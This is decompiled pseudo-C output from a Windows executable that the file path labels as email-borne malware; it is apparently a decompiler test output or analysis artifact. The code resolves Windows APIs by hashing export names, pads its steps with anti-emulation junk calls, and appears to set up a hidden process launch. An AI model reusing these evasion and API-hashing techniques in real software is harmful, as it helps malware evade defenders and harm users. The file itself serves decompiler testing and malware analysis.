// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0113/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000()
{
	return;
}

word32 fn0040100B(Eq_4 * fs, word32 dwArg04, word32 dwArg08)
{
	word32 dwLoc14_15 = fs->dw0000;
	fs->dw0000 = fp - 0x00000014;
	fn00401000();
	Eq_15 * eax_73 = (dwArg04->dw003C + dwArg04)->dw0078 + dwArg04;
	word16 * eax_77[] = eax_73->dw0024 + dwArg04;
	lstrcpyA(fp - 0x0000003C, 0x00403010);
	lstrcpyA(fp - 0x0000003C, 0x0040300E);
	if (SetFileSecurityA(0x00000000, 0x00000000, 0x00000000) != 0x00000000)
		dwArg08 = dwArg08 + 0x000BA5A9;
	fp->dwFFFFFFF8 = 0x0040300C;
	fp->dwFFFFFFF8 = fp - 0x0000003C;
	lstrcpyA(0x00000000, 0x00000000);
	fp->dwFFFFFFF8 = 0x00000000;
	fp->dwFFFFFFF8 = 0x00000000;
	fp->dwFFFFFFF8 = 0x00000000;
	fp->dwFFFFFFF8 = 0x00000852;
	if (SetFileSecurityA(0x00000000, 0x00000000, 0x00000000) == 0x00000000)
		dwArg08 = dwArg08 + 0x00012410;
	fp->dwFFFFFFF8 = 0xFFFFFFFF;
	word32 * eax_136[] = eax_73->dw0020 + dwArg04;
	word32 * eax_141[] = eax_73->dw001C + dwArg04;
	int32 edi_143 = 0x00000000;
	word32 eax_170;
	while (edi_143 < eax_73->dw0018)
	{
		fp->dwFFFFFFF8 = 0x00000000;
		fp->dwFFFFFFF8 = 0x00000000;
		fp->dwFFFFFFF8 = 0x00000000;
		fp->dwFFFFFFF8 = 0x00000000;
		fp->dwFFFFFFF8 = 0x00000000;
		fp->dwFFFFFFF8 = 0x00000000;
		fp->dwFFFFFFF8 = 0x00000000;
		fp->dwFFFFFFF8 = 0x00000000;
		fp->dwFFFFFFF8 = 0x00000000;
		fp->dwFFFFFFF8 = 0x00000000;
		fp->dwFFFFFFF8 = 0x00000000;
		fp->dwFFFFFFF8 = 0x00000000;
		fp->dwFFFFFFF8 = 0x00000000;
		fp->dwFFFFFFF8 = 0x00000000;
		fp->dwFFFFFFF8 = 0x00000000;
		fp->dwFFFFFFF8 = 0x00000000;
		fp->dwFFFFFFF8 = 0x00000000;
		fn00401000();
		dwLoc48 = dwLoc48 & 0x00000000;
		word32 eax_229 = eax_136[edi_143] + dwArg04;
		dwLoc50 = dwLoc50 & 0x00000000;
		while (dwLoc50->b0000 != 0x00)
		{
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fn00401000();
			dwLoc48 = (int32) dwLoc50->b0000 ^ 0x0000005C ^ (dwLoc48 << 0x00000007 | dwLoc48 >>u 0x00000019);
			dwLoc50 = dwLoc50 + 0x00000001;
		}
		if (dwLoc48 == dwArg08)
		{
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fp->dwFFFFFFF8 = 0x00000000;
			fn00401000();
			eax_170 = eax_141[(word32) eax_77[edi_143]] + dwArg04;
			goto l004011F7;
		}
		edi_143 = edi_143 + 0x00000001;
	}
	eax_170 = 0x00000000;
l004011F7:
	fs->dw0000 = dwLoc14_15;
	return eax_170;
}

void fn0040120A()
{
	GetModuleHandleA(0x00000000);
	fn00401000();
	fn00401000();
	Mem0[0x004043E0:word32]();
	fn00401000();
	fn00401000();
	Mem0[0x004043E4:word32]();
	fn00401000();
	globals->dw4043E8 = 0x00010007;
	fn00401000();
	Mem236[0x004046B4:word32]();
	fn00401000();
	globals->dw4044A0 = 0x00401CF1;
	fn00401000();
	Mem316[0x004046B8:word32]();
	fn00401000();
	Mem316[0x004046BC:word32]();
	return;
}

void fn0040140C(Eq_4 * fs)
{
	word32 eax_14 = LoadLibraryA(globals->t404054);
	fn00401000();
	CloseHandle(0x00000039);
	globals->ptr4046C0 = fn0040100B(fs, eax_14, 0x34D44152);
	fn00401000();
	GetFileType(0x0000001C);
	GetModuleHandleA(0x00000000);
	globals->ptr4043E0 = fn0040100B(fs, eax_14, 0xE85A7333);
	globals->ptr4043E4 = fn0040100B(fs, eax_14, 0xE219CDD0);
	fn00401000();
	globals->ptr4046B4 = fn0040100B(fs, eax_14, 0xD8F892CA);
	fn00401000();
	globals->ptr4046B8 = fn0040100B(fs, eax_14, 0xD8F8BACA);
	globals->ptr4046BC = fn0040100B(fs, eax_14, 0xECAD74AC);
	globals->ptr4046C4 = fn0040100B(fs, eax_14, 0xB65E5643);
	globals->ptr4046C8 = fn0040100B(fs, eax_14, 0x02BE608E);
	globals->ptr4046CC = fn0040100B(fs, eax_14, 0x5F894BB1);
	GetModuleFileNameA(0x00000000, 0x004046D0, 0x00000104);
	fn00401000();
	lstrcpyA(0x004047D4, globals->t404048);
	lstrcatA(0x004047D4, globals->t404060);
	fn00401000();
	lstrcatA(0x004047D4, globals->t40400C);
	fn00401000();
	word32 eax_382 = lstrcatA(0x004047D4, 0x004046D0);
	fn00401000();
	globals->dw4048D8 = 0x00000044;
	fn00401000();
	globals->dw404904 = 0x00000001;
	fn00401000();
	globals->w404908 = 0x0002;
	Mem497[0x004046C0:word32]();
	lstrcpyA(fp - 0x00000024, globals->t404018);
	lstrcatA(fp - 0x00000024, globals->t404020);
	lstrcatA(fp - 0x00000024, globals->t404050);
	lstrcatA(fp - 0x00000024, globals->t40402C);
	Mem497[0x004046CC:word32]();
	fn00401000();
	globals->ptr40491C = fn0040100B(fs, fp - 0x00000024, 0x44B87CEF);
	fn00401000();
	globals->ptr404920 = fn0040100B(fs, fp - 0x00000024, 0x9ABCF640);
	fn00401000();
	globals->ptr404924 = fn0040100B(fs, fp - 0x00000024, 0xCA98CF83);
	fn00401000();
	globals->ptr404928 = fn0040100B(fs, fp - 0x00000024, 0x68C45B87);
	fn00401000();
	code * eax_769 = fn0040100B(fs, fp - 0x00000024, 0x2FAD89FE);
	globals->ptr40492C = eax_769;
	fn00401000();
	Mem771[0x004046CC:word32]();
	fn00401000();
	code * eax_853 = fn0040100B(fs, 0x00000000, 0xC5EE030E);
	globals->ptr404930 = eax_853;
	fn00401000();
	fn0040120A();
	fn00401000();
	Mem855[0x004046C8:word32]();
	return;
}

